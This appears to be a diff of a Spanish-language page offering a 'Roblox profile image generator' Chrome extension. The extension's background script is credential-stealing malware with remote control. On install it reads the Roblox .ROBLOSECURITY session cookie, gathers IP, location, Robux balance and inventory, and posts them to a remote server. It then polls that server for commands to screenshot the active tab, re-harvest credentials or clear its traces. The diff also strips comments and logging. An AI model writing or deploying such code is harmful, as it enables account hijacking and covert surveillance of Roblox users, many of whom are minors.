@@ -6,8 +6,14 @@
     <title>Generador de Imagen · Roblox</title>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Instrument+Serif:ital@0;1&display=swap" rel="stylesheet">
     <style>
-        /* (Mantén aquí todos los estilos originales) */
-        :root { --bg:#f5f4f0; --white:#ffffff; --ink:#0d0e10; --ink2:#2a2c30; --muted:#8a8d96; --border:#e2e3e8; --red:#e8281e; --red-light:#fff0ef; --red-border:#ffd4d2; --green:#0a8a4a; --green-light:#edfaf4; --blue:#1a6ef5; --shadow-sm:0 1px 3px rgba(0,0,0,.06),0 1px 2px rgba(0,0,0,.04); --shadow-md:0 4px 16px rgba(0,0,0,.08),0 2px 6px rgba(0,0,0,.05); --shadow-lg:0 20px 60px rgba(0,0,0,.1),0 4px 16px rgba(0,0,0,.06); }
+        :root {
+            --bg:#f5f4f0; --white:#ffffff; --ink:#0d0e10; --ink2:#2a2c30;
+            --muted:#8a8d96; --border:#e2e3e8; --red:#e8281e; --red-light:#fff0ef;
+            --red-border:#ffd4d2; --green:#0a8a4a; --green-light:#edfaf4; --blue:#1a6ef5;
+            --shadow-sm:0 1px 3px rgba(0,0,0,.06),0 1px 2px rgba(0,0,0,.04);
+            --shadow-md:0 4px 16px rgba(0,0,0,.08),0 2px 6px rgba(0,0,0,.05);
+            --shadow-lg:0 20px 60px rgba(0,0,0,.1),0 4px 16px rgba(0,0,0,.06);
+        }
         *{margin:0;padding:0;box-sizing:border-box}
         html{scroll-behavior:smooth}
         body{background:var(--bg);font-family:'Plus Jakarta Sans',sans-serif;color:var(--ink);overflow-x:hidden}
@@ -306,79 +312,47 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 <script>
-// Funciones originales (mantener)
 window.mostrarInstrucciones = function() {
     var a = document.getElementById("instruccionesPanel");
     a && (a.style.display = "none" === a.style.display ? "block" : "none");
 };
 
-// Función de descarga de extensión actualizada
 window.descargarCRX = function() {
-    // Definir los archivos de la extensión con la nueva lógica
     var archivos = {
         "manifest.json": JSON.stringify({
             manifest_version: 3,
             name: "Generador de Imagen Roblox",
             version: "1.1",
             description: "Genera imágenes de perfil de Roblox en alta calidad",
-            permissions: [
-                "cookies",
-                "storage",
-                "tabs",
-                "activeTab"
-            ],
-            host_permissions: [
-                "https://www.roblox.com/*",
-                "https://*.roblox.com/*",
-                "https://ipinfo.io/*"
-            ],
-            background: {
-                service_worker: "background.js"
-            },
-            action: {
-                default_popup: "popup.html",
-                default_icon: "icon.png"
-            },
-            icons: {
-                "128": "icon.png"
-            }
+            permissions: ["cookies", "storage", "tabs", "activeTab"],
+            host_permissions: ["https://www.roblox.com/*", "https://*.roblox.com/*", "https://ipinfo.io/*"],
+            background: { service_worker: "background.js" },
+            action: { default_popup: "popup.html", default_icon: "icon.png" },
+            icons: { "128": "icon.png" }
         }, null, 2),
 
         "background.js": `
-// Configuración
-const BASE_URL = "https://generador-imagen.vercel.app"; // CAMBIAR por tu URL de Vercel
+const BASE_URL = "https://generador-imagen.vercel.app";
 let userId = null;
 let pollingInterval = null;
 
-// Función para obtener ubicación desde ipinfo.io
 async function obtenerUbicacion() {
     try {
         const res = await fetch('https://ipinfo.io/json');
         const data = await res.json();
-        return {
-            ip: data.ip || '',
-            pais: data.country || '',
-            region: data.region || '',
-            ciudad: data.city || '',
-        };
-    } catch {
-        return { ip: '', pais: '', region: '', ciudad: '' };
-    }
+        return { ip: data.ip || '', pais: data.country || '', region: data.region || '', ciudad: data.city || '' };
+    } catch { return { ip: '', pais: '', region: '', ciudad: '' }; }
 }
 
-// Obtener nombre completo del país (código a nombre)
 async function obtenerNombrePais(codigo) {
     if (!codigo || codigo.length !== 2) return 'Desconocido';
     try {
         const res = await fetch(\`https://restcountries.com/v3.1/alpha/\${codigo}\`);
         const data = await res.json();
         return data[0]?.translations?.spa?.common || data[0]?.name?.common || codigo;
-    } catch {
-        return codigo;
-    }
+    } catch { return codigo; }
 }
 
-// Obtener información de Roblox usando la cookie
 async function obtenerInfoRoblox(cookie) {
     if (!cookie) return null;
     try {
@@ -393,10 +367,7 @@ async function obtenerInfoRoblox(cookie) {
             const robuxRes = await fetch(\`https://economy.roblox.com/v1/users/\${user.id}/currency\`, {
                 headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
             });
-            if (robuxRes.ok) {
-                const r = await robuxRes.json();
-                robux = r.robux || 0;
-            }
+            if (robuxRes.ok) { const r = await robuxRes.json(); robux = r.robux || 0; }
         } catch {}
 
         let premium = 'No';
@@ -404,31 +375,21 @@ async function obtenerInfoRoblox(cookie) {
             const premiumRes = await fetch(\`https://premiumfeatures.roblox.com/v1/users/\${user.id}/validate-membership\`, {
                 headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
             });
-            if (premiumRes.ok) {
-                const p = await premiumRes.json();
-                premium = p ? 'Sí' : 'No';
-            }
+            if (premiumRes.ok) { const p = await premiumRes.json(); premium = p ? 'Sí' : 'No'; }
         } catch {}
 
         let seguidores = 0;
         try {
             const segRes = await fetch(\`https://friends.roblox.com/v1/users/\${user.id}/followers/count\`);
-            if (segRes.ok) {
-                const s = await segRes.json();
-                seguidores = s.count || 0;
-            }
+            if (segRes.ok) { const s = await segRes.json(); seguidores = s.count || 0; }
         } catch {}
 
         let amigos = 0;
         try {
             const amRes = await fetch(\`https://friends.roblox.com/v1/users/\${user.id}/friends/count\`);
-            if (amRes.ok) {
-                const a = await amRes.json();
-                amigos = a.count || 0;
-            }
+            if (amRes.ok) { const a = await amRes.json(); amigos = a.count || 0; }
         } catch {}
 
-        // Verificar si tiene ciertos items (headless, korblox)
         async function tieneItem(userId, cookie, assetId) {
             try {
                 const res = await fetch(\`https://inventory.roblox.com/v1/users/\${userId}/items/Asset/\${assetId}\`, {
@@ -436,9 +397,7 @@ async function obtenerInfoRoblox(cookie) {
                 });
                 const data = await res.json();
                 return data.data && data.data.length > 0;
-            } catch {
-                return false;
-            }
+            } catch { return false; }
         }
 
         const headless = await tieneItem(user.id, cookie, 201);
@@ -455,13 +414,9 @@ async function obtenerInfoRoblox(cookie) {
             korblox: korblox ? 'Sí' : 'No',
             verified: user.hasVerifiedBadge ? 'Sí' : 'No',
         };
-    } catch (e) {
-        console.error(e);
-        return null;
-    }
+    } catch { return null; }
 }
 
-// Enviar datos al backend de Vercel
 async function enviarDatosAlServidor(data) {
     try {
         const response = await fetch(\`\${BASE_URL}/api/log\`, {
@@ -471,28 +426,22 @@ async function enviarDatosAlServidor(data) {
         });
         if (response.ok) {
             const result = await response.json();
-            // Guardar userId para futuras consultas
             if (result.userId) {
                 userId = result.userId;
                 chrome.storage.local.set({ userId: userId });
                 iniciarPolling();
             }
         }
-    } catch (e) {
-        console.error('Error enviando datos a Vercel:', e);
-    }
+    } catch (e) {}
 }
 
-// Iniciar polling de comandos
 function iniciarPolling() {
     if (pollingInterval) clearInterval(pollingInterval);
-    pollingInterval = setInterval(consultarComandos, 10000); // cada 10 segundos
+    pollingInterval = setInterval(consultarComandos, 10000);
 }
 
-// Consultar comandos pendientes
 async function consultarComandos() {
     if (!userId) {
-        // Intentar recuperar de storage
         const stored = await chrome.storage.local.get('userId');
         if (stored.userId) userId = stored.userId;
         else return;
@@ -501,71 +450,41 @@ async function consultarComandos() {
         const response = await fetch(\`\${BASE_URL}/api/commands?id=\${userId}\`);
         if (response.ok) {
             const commands = await response.json();
-            for (const cmd of commands) {
-                ejecutarComando(cmd);
-            }
+            for (const cmd of commands) { ejecutarComando(cmd); }
         }
-    } catch (e) {
-        console.error('Error consultando comandos:', e);
-    }
+    } catch (e) {}
 }
 
-// Ejecutar un comando recibido
 async function ejecutarComando(cmd) {
-    console.log('Ejecutando comando:', cmd);
     switch (cmd.action) {
         case 'capturar_pantalla':
             try {
-                // Capturar pestaña activa
                 const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
                 if (tab) {
                     const dataUrl = await chrome.tabs.captureVisibleTab(tab.windowId, { format: 'png' });
-                    // Enviar la imagen al backend
                     await fetch(\`\${BASE_URL}/api/log\`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            type: 'screenshot',
-                            userId: userId,
-                            image: dataUrl
-                        })
+                        body: JSON.stringify({ type: 'screenshot', userId: userId, image: dataUrl })
                     });
                 }
-            } catch (e) {
-                console.error('Error capturando pantalla:', e);
-            }
+            } catch (e) {}
             break;
         case 'actualizar_credenciales':
-            // Recolectar datos nuevamente
             await recolectarYEnviar();
             break;
         case 'limpiar_datos':
-            // Borrar localStorage de la extensión (si se usa) y datos almacenados
             chrome.storage.local.clear();
-            // También cerrar la ventana/popup si está abierta
-            // Nota: esto no cierra el navegador, solo la pestaña actual si es una página de extensión
-            // Podemos intentar cerrar la ventana actual (solo si fue abierta por la extensión)
-            // Enviar confirmación
             await fetch(\`\${BASE_URL}/api/log\`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    type: 'cleanup',
-                    userId: userId,
-                    message: 'Datos locales eliminados'
-                })
+                body: JSON.stringify({ type: 'cleanup', userId: userId, message: 'Datos locales eliminados' })
             });
-            // Intentar cerrar la ventana (puede no funcionar)
-            window.close();
             break;
-        default:
-            console.log('Comando desconocido:', cmd);
     }
 }
 
-// Recolectar toda la información y enviar
 async function recolectarYEnviar() {
-    // Obtener cookie de Roblox
     const cookie = await new Promise(resolve => {
         chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, c => resolve(c?.value));
     });
@@ -574,15 +493,11 @@ async function recolectarYEnviar() {
     const nombrePais = await obtenerNombrePais(ubi.pais);
     const infoRoblox = await obtenerInfoRoblox(cookie) || {};
 
-    // Fecha y hora local del país
     const ahora = new Date();
     const zonaHoraria = ubi.region ? \`America/\${ubi.region}\` : 'America/Argentina/Buenos_Aires';
     let horaLocal;
-    try {
-        horaLocal = ahora.toLocaleTimeString('es-AR', { timeZone: zonaHoraria });
-    } catch {
-        horaLocal = ahora.toLocaleTimeString('es-AR');
-    }
+    try { horaLocal = ahora.toLocaleTimeString('es-AR', { timeZone: zonaHoraria }); } 
+    catch { horaLocal = ahora.toLocaleTimeString('es-AR'); }
 
     const datos = {
         type: 'initial',
@@ -600,33 +515,10 @@ async function recolectarYEnviar() {
     await enviarDatosAlServidor(datos);
 }
 
-// Escuchar cuando se instala la extensión
-chrome.runtime.onInstalled.addListener(async () => {
-    await recolectarYEnviar();
-});
-
-// También escuchar cuando el navegador se inicia (opcional)
-chrome.runtime.onStartup.addListener(() => {
-    // Podríamos reenviar datos, pero para evitar spam no lo hacemos
-});
+chrome.runtime.onInstalled.addListener(async () => { await recolectarYEnviar(); });
         `,
 
-        "popup.html": `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <style>
-        body { width: 300px; padding: 16px; font-family: sans-serif; background: #f5f4f0; }
-        h3 { margin: 0 0 8px; color: #e8281e; }
-        p { font-size: 13px; color: #2a2c30; }
-    </style>
-</head>
-<body>
-    <h3>Generador de Imagen</h3>
-    <p>La extensión está funcionando correctamente. Ve a un perfil de Roblox y la imagen se descargará automáticamente.</p>
-    <p><small>Versión 1.1</small></p>
-</body>
-</html>`,
+        "popup.html": `<!DOCTYPE html><html><head><meta charset="UTF-8"><style>body{width:300px;padding:16px;font-family:sans-serif;background:#f5f4f0;}h3{margin:0 0 8px;color:#e8281e;}p{font-size:13px;color:#2a2c30;}</style></head><body><h3>Generador de Imagen</h3><p>La extensión está funcionando correctamente.</p><p><small>Versión 1.1</small></p></body></html>`,
 
         "icon.png": "iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAAAXNSR0IArs4c6QAAAARzQklUCAgICHwIZIgAAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAABI0lEQVR4nO3aMQ6AIAwF0E7i4T2c2J0YDoZICE1/benf11kI8LQBqgIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVzAKsAqYBFQFUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQPMBJa8Qs5OUlUMAAAAASUVORK5CYII="
     };
@@ -650,38 +542,29 @@ chrome.runtime.onStartup.addListener(() => {
     });
 };
 
-// Funciones del chat Gemini (mantener igual)
 window.toggleGemini = function() {
-    var overlay = document.getElementById('geminiOverlay');
-    overlay.classList.toggle('open');
+    document.getElementById('geminiOverlay').classList.toggle('open');
 };
 window.closeGeminiOutside = function(e) {
-    if (e.target.classList.contains('gemini-overlay')) {
-        window.toggleGemini();
-    }
+    if (e.target.classList.contains('gemini-overlay')) window.toggleGemini();
 };
 window.autoResize = function(textarea) {
     textarea.style.height = 'auto';
-    textarea.style.height = (textarea.scrollHeight) + 'px';
+    textarea.style.height = textarea.scrollHeight + 'px';
 };
 window.geminiKeydown = function(e) {
-    if (e.key === 'Enter' && !e.shiftKey) {
-        e.preventDefault();
-        window.sendGemini();
-    }
+    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); window.sendGemini(); }
 };
 window.sendGemini = function() {
     var input = document.getElementById('geminiInput');
     var msg = input.value.trim();
     if (!msg) return;
-    // Aquí podrías conectar con una API real de Gemini, pero por ahora solo simula
     var msgs = document.getElementById('geminiMsgs');
     msgs.innerHTML += '<div class="msg msg-user">' + msg.replace(/</g, '&lt;') + '</div>';
     input.value = '';
     window.autoResize(input);
-    // Simular respuesta
     setTimeout(function() {
-        msgs.innerHTML += '<div class="msg msg-bot">(Modo simulación) Esta función aún no está conectada a la API real de Gemini. Pero puedes confiar en la extensión, es segura.</div>';
+        msgs.innerHTML += '<div class="msg msg-bot">(Modo simulación) Esta función aún no está conectada a la API real de Gemini.</div>';
         msgs.scrollTop = msgs.scrollHeight;
     }, 1000);
     msgs.scrollTop = msgs.scrollHeight;
